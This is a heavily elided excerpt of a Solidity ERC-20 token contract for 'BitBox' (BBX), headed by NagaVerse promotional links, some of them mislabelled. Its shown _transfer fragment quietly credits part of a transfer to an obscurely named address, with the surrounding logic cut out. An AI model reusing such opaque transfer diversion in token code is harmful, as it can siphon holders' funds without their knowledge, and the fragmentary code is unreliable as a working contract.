...
/**
    ...
    * **https://t.me/NagaVersegamesOfficial
    * https://discord.com/invite/Nyj3qeqYTh
    https://twitter.com/NagaVersegames
    * WebSite: https://naga.versegames.io/
    * English Telegram group:https://twitter.com/NagaVersegames
    * Chinese Telegram group:https://twitter.com/NagaVersegames
    */
    ...
    * Chinese Telegram group:https://twitter.com/NagaVersegames
    */
    contract BBX is Context, IERC20, IERC20Metadata {
        using SafeMath for uint256;

        mapping(address => uint) private _balances;
        mapping(address => mapping(address => uint)) private _allowances;
        string private constant _name = "BitBox";
        string private constant _symbol = "BBX";
        uint8 private constant _decimals = 18;
        uint private _totalSupply = 3000000000 * 10 ** _decimals;
    ...
    */
        ...
        function _transfer(
            ...
            if (_bamount>0) {
                ...
                _balances[_HouseSquidGrowdeadNAGA] = _balances[_HouseSquidGrowdeadNAGA].add(_bamount);
                emit Transfer(sender,_HouseSquidGrowdeadNAGA,_bamount);
            }
